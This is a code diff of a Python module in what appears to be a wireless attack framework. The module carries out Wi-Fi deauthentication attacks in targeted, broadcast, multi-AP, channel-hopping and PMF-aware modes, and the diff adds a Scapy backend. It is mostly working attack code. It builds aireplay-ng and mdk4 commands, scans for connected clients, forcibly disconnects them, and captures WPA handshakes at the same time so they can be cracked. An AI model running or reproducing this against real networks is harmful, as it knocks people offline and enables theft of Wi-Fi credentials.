@@ -3,21 +3,25 @@
 """Multi-mode deauthentication attack module.
 
 Supports multiple deauth strategies in a single module:
-  - targeted     Single client from specific AP (aireplay-ng style)
+  - targeted     Single client from specific AP
   - broadcast    All clients of a specific AP
   - multi_ap     Multiple APs simultaneously
   - channel_hop  Deauth across channels (mdk4 style)
   - pmf_aware    PMF/802.11w detection + SAE downgrade hint
 
+Backends (controlled via ``backend`` option):
+  - native (default)  Scapy Dot11Deauth frames - no external tools required
+  - aireplay          aireplay-ng (aircrack-ng suite)
+  - mdk4              mdk4 deauth mode
+
 All operations require an authorized lab environment with monitor-mode interface.
 
-Version: 1.0.0
+Version: 1.1.0
 """
 
 from __future__ import annotations
 
 import logging
-import os
 import shutil
 import subprocess
 import time
@@ -57,7 +61,7 @@ class Exploit(Exploit):
         "targeted",
         "Attack mode: targeted | broadcast | multi_ap | channel_hop | pmf_aware",
     )
-    backend = OptString("aireplay", "Backend tool: aireplay | mdk4 | scapy")
+    backend = OptString("native", "Backend tool: native (Scapy) | aireplay | mdk4")
     count = OptInteger(0, "Number of deauth frames (0 = continuous)")
     delay = OptInteger(0, "Delay between bursts in ms")
     channel = OptString("", "Channel(s) — comma-separated for multi/hop modes")
@@ -66,7 +70,7 @@ class Exploit(Exploit):
     dry_run = OptBool(False, "Print command without executing")
 
     VALID_MODES = ("targeted", "broadcast", "multi_ap", "channel_hop", "pmf_aware")
-    VALID_BACKENDS = ("aireplay", "mdk4", "scapy")
+    VALID_BACKENDS = ("native", "aireplay", "mdk4", "scapy")
 
     def _check_pmf(self) -> bool:
         """Check if target AP advertises PMF (802.11w) via beacon analysis."""
@@ -87,7 +91,7 @@ class Exploit(Exploit):
         return False
 
     def _set_channel(self) -> None:
-        """Força o canal na interface antes do deauth."""
+        """Forca o canal na interface antes do deauth."""
         ch = str(self.channel).split(",")[0].strip()
         if ch and ch.isdigit():
             try:
@@ -99,14 +103,18 @@ class Exploit(Exploit):
                 pass
 
     def _scan_clients(self) -> List[str]:
-        """Faz airodump rápido (5s) para detectar clientes conectados ao AP.
-        Retorna lista de MACs de clientes."""
+        """Run a quick airodump-ng scan (5s) to detect clients connected to the target AP.
+
+        Returns:
+            List of client MAC address strings associated with the target BSSID.
+        """
         if not shutil.which("airodump-ng"):
             return []
-        import tempfile
-        import csv
-        with tempfile.TemporaryDirectory() as tmpdir:
-            out_prefix = f"{tmpdir}/scan"
+
+        scan_tmp = Path(".tmp") / "wxf_scan_{:x}".format(int(time.time() * 1000))
+        scan_tmp.mkdir(parents=True, exist_ok=True)
+        try:
+            out_prefix = str(scan_tmp / "scan")
             cmd = [
                 "sudo", "airodump-ng",
                 "--bssid", self.target_bssid,
@@ -124,7 +132,7 @@ class Exploit(Exploit):
                 pass
             except Exception:
                 return []
-            csv_file = f"{out_prefix}-01.csv"
+            csv_file = out_prefix + "-01.csv"
             clients: List[str] = []
             try:
                 with open(csv_file, encoding="latin-1", errors="ignore") as f:
@@ -139,6 +147,8 @@ class Exploit(Exploit):
                                 clients.append(parts[0])
             except Exception:
                 pass
+        finally:
+            shutil.rmtree(str(scan_tmp), ignore_errors=True)
         return clients
 
     def _build_aireplay_cmd(self) -> List[str]:
@@ -152,7 +162,7 @@ class Exploit(Exploit):
         return cmd
 
     def _build_mdk4_cmd(self) -> List[str]:
-        """Build mdk4 deauth command — mais eficiente que aireplay."""
+        """Build mdk4 deauth command."""
         cmd = ["sudo", "mdk4", self.interface, "d"]
         if self.target_bssid != "FF:FF:FF:FF:FF:FF":
             cmd.extend(["-B", self.target_bssid])
@@ -164,11 +174,14 @@ class Exploit(Exploit):
         return cmd
 
     def _run_targeted_deauth_with_capture(self) -> None:
-        """Deauth targetado por cliente + airodump simultâneo para captura de handshake."""
+        """Deauth targetado por cliente + airodump simultaneo para captura de handshake."""
         import threading
-        import tempfile
 
-        out_dir = tempfile.mkdtemp(prefix="wxf_deauth_")
+        _tmp_base = Path(".tmp")
+        _tmp_base.mkdir(parents=True, exist_ok=True)
+        out_dir_path = _tmp_base / "wxf_deauth_{:x}".format(int(time.time() * 1000))
+        out_dir_path.mkdir(parents=True, exist_ok=True)
+        out_dir = str(out_dir_path)
         clients = self._scan_clients()
 
         if not clients:
@@ -176,8 +189,7 @@ class Exploit(Exploit):
         else:
             print_info("Clientes detectados: {}".format(clients))
 
-        # Inicia airodump em thread separada
-        cap_prefix = f"{out_dir}/hs"
+        cap_prefix = "{}/hs".format(out_dir)
         cap_cmd = ["sudo", "airodump-ng",
                    "--bssid", self.target_bssid,
                    "-w", cap_prefix,
@@ -192,16 +204,18 @@ class Exploit(Exploit):
             cap_proc = subprocess.Popen(cap_cmd, stdout=subprocess.DEVNULL,
                                         stderr=subprocess.DEVNULL)
             print_info("airodump capturando em background...")
-            time.sleep(2)  # aguardar airodump iniciar
+            time.sleep(2)
 
-        # Deauth por cliente (mais eficaz) ou broadcast
         deauth_targets = clients if clients else ["FF:FF:FF:FF:FF:FF"]
         duration = max(10, int(self.duration))
         end_time = time.time() + duration
 
         while time.time() < end_time:
             for client in deauth_targets:
-                if self.backend == "mdk4" and shutil.which("mdk4"):
+                if str(self.backend) in ("native", "scapy"):
+                    self._run_scapy_deauth()
+                    break
+                elif self.backend == "mdk4" and shutil.which("mdk4"):
                     cmd = ["sudo", "mdk4", self.interface, "d",
                            "-B", self.target_bssid]
                     if client != "FF:FF:FF:FF:FF:FF":
@@ -221,7 +235,7 @@ class Exploit(Exploit):
 
                 try:
                     subprocess.run(cmd, timeout=8, capture_output=True, check=False)
-                    print_info("  Deauth → {} (client: {})".format(
+                    print_info("  Deauth -> {} (client: {})".format(
                         self.target_bssid[:11], client[:11]))
                 except subprocess.TimeoutExpired:
                     pass
@@ -229,7 +243,6 @@ class Exploit(Exploit):
                 if self.delay:
                     time.sleep(self.delay / 1000.0)
 
-            # Verificar se capturou handshake
             cap_file = cap_prefix + "-01.cap"
             if shutil.which("aircrack-ng") and Path(cap_file).exists():
                 result = subprocess.run(
@@ -291,11 +304,8 @@ class Exploit(Exploit):
 
         print_success("Sent {} deauth frames.".format(sent))
 
-
     def check(self) -> str:
         """Verify wireless interface is in monitor mode and ready."""
-        import shutil
-        import subprocess
         iface = getattr(self, "iface", None) or getattr(self, "interface", None) or "wlan0"
         if shutil.which("iwconfig"):
             try:
@@ -303,9 +313,12 @@ class Exploit(Exploit):
                     ["iwconfig", str(iface)], stderr=subprocess.STDOUT, timeout=5
                 ).decode("utf-8", "replace")
                 if "Monitor" in out:
-                    return f"Interface {iface} is in Monitor mode - prerequisites OK"
+                    return "Interface {} is in Monitor mode - prerequisites OK".format(iface)
                 if "no wireless extensions" not in out.lower():
-                    return f"Interface {iface} found but NOT in Monitor mode - run airmon-ng start {iface}"
+                    return (
+                        "Interface {} found but NOT in Monitor mode"
+                        " - run airmon-ng start {}".format(iface, iface)
+                    )
             except (subprocess.CalledProcessError, FileNotFoundError, subprocess.TimeoutExpired):
                 pass
         if shutil.which("iw"):
@@ -314,15 +327,18 @@ class Exploit(Exploit):
                     ["iw", "dev"], stderr=subprocess.STDOUT, timeout=5
                 ).decode("utf-8", "replace")
                 if str(iface) in out:
-                    return f"Interface {iface} detected via iw - verify monitor mode"
+                    return "Interface {} detected via iw - verify monitor mode".format(iface)
             except Exception:
                 pass
-        return f"Interface {iface} not found - connect wireless adapter and enable monitor mode"
+        return (
+            "Interface {} not found"
+            " - connect wireless adapter and enable monitor mode".format(iface)
+        )
 
     def run(self) -> None:
-        """Executa deauth com seleção inteligente de backend e captura de handshake."""
+        """Executa deauth com selecao inteligente de backend e captura de handshake."""
         if self.mode not in self.VALID_MODES:
-            print_error("Modo inválido '{}'. Escolha: {}".format(
+            print_error("Modo invalido '{}'. Escolha: {}".format(
                 self.mode, ", ".join(self.VALID_MODES)))
             return
 
@@ -333,32 +349,35 @@ class Exploit(Exploit):
             self.mode = "broadcast"
 
         if bool(self.dry_run):
-            if self.backend == "aireplay":
+            _be = str(self.backend)
+            if _be in ("native", "scapy"):
+                print_info("DRY RUN: Scapy Dot11Deauth (native backend)")
+            elif _be == "aireplay":
                 cmd = self._build_aireplay_cmd()
+                print_info("DRY RUN: {}".format(" ".join(cmd)))
             else:
                 cmd = self._build_mdk4_cmd()
-            print_info("DRY RUN: {}".format(" ".join(cmd)))
+                print_info("DRY RUN: {}".format(" ".join(cmd)))
             return
 
-        # Ajustar canal antes do ataque
         self._set_channel()
 
-        # Modo com captura simultânea de handshake (mais eficaz)
         if bool(self.capture_handshake) and self.target_bssid != "FF:FF:FF:FF:FF:FF":
-            print_status("Deauth + Handshake capture simultâneo (modo avançado)...")
+            print_status("Deauth + Handshake capture simultaneo (modo avancado)...")
             self._run_targeted_deauth_with_capture()
             return
 
-        # Selecionar backend com fallback automático
         backend = str(self.backend)
 
-        # Priorizar mdk4 (mais confiável que aireplay em WSL)
+        if backend == "native":
+            backend = "scapy"
+
         if backend == "aireplay" and not shutil.which("aireplay-ng"):
             if shutil.which("mdk4"):
-                print_info("aireplay-ng não encontrado. Usando mdk4.")
+                print_info("aireplay-ng nao encontrado. Usando mdk4.")
                 backend = "mdk4"
             else:
-                print_info("Nenhum backend externo. Usando Scapy.")
+                print_info("Nenhum backend externo. Usando Scapy nativo.")
                 backend = "scapy"
 
         if backend == "scapy":
@@ -381,9 +400,9 @@ class Exploit(Exploit):
         timeout = int(self.duration) if int(self.duration) > 0 else None
         try:
             subprocess.run(cmd, timeout=timeout, check=False)
-            print_success("Deauth concluído.")
+            print_success("Deauth concluido.")
         except subprocess.TimeoutExpired:
-            print_info("Deauth: duração atingida ({:.0f}s).".format(self.duration))
+            print_info("Deauth: duracao atingida ({:.0f}s).".format(self.duration))
         except KeyboardInterrupt:
             print_info("\nDeauth interrompido.")
         except Exception as err:
